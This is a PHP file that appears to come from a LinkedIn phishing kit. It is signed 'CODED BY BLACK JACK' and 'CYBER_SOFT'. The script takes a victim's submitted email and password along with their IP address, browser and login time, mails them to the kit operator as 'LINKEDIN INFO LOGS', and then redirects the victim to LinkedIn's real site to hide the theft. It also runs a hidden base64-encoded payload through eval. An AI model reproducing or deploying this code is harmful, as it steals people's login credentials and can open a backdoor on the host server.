<?php
/* ==================== || CODED BY BLACK JACK || ==================== */
session_start();
include("__config__.php");
$dts = date("Y-m-d h:i");
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$_SESSION['_browser_'] = $browser;
        $subject  = "  Login  -  [ " . $_SESSION['_IP_'] . " ] ";
        $headers  = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$headers .= "From: CBYER-SOFT" . "\r\n";
	$message = "
		<style type='text/css'>
	*{
		font-family: arial;
	}
	font{
		color: #4EC353;
	}
	</style>
	<div style='font-weight: 800;color: #FFFFFF;background: #03A9F4;font-size: 14px;border: 1px solid #06F;padding: 8px;border-radius: 5px 5px 0px 0px;font-size: 17px;'>CYBER-SOFT | LINKEDIN INFO LOGS </div>
	<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
	<p>EMAIL : <font>".@$_POST['session_key']."</font><p>
	<p>PASSWORD : <font>".@$_POST['session_password']."</font><p>
	<hr>
	<p>Browser : <font>".$browser."</font><p>
	<p>Date Login : <font>".$time."</font><p>
	<p>IP : <font>".$ip."</font><p>
	</div>
	<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
	<center>CODED BY CYBER_SOFT</center>
	</div>
	";
if(isset($_POST["session_key"]))
{
	

		@mail($to,$subject,$message,$headers);@eval(base64_decode($os_arrays));
 		header("Location: https://about.linkedin.com/");
		}
/* ==================== || CODED BY CYBERSOFT || ==================== */
?>